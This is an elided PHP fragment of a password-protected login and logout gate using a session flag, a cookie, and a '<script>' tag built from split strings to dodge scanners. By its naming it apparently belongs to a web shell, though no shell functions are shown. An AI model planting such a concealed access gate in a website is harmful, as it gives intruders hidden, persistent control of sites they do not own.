...
if (isset($_POST['gasken'])) {
    if (SHA1($_POST['passnya']) == $passwd) {
        ...
        $_SESSION["enjoyatmoment"] = "enjoyatmoment";
        setcookie('muaderpa', $my_self, time() + 3600 * 24);
    } else {
...
if (isset($_GET['logout'])) {
    ...
    session_unset();
    session_destroy();
    setcookie('muaderpa', '', time() - 3600);
    echo "<s" . "c" . "ri" . "pt" . ">" . "window.location.assign('" . $_SERVER['PHP_SELF'] . "')" . "</" . "sc" . "ri" . "pt" . ">";
    exit();
}
if (empty($_SESSION['enjoyatmoment'])) {
    if (empty($_COOKIE['muaderpa'])) {
?>
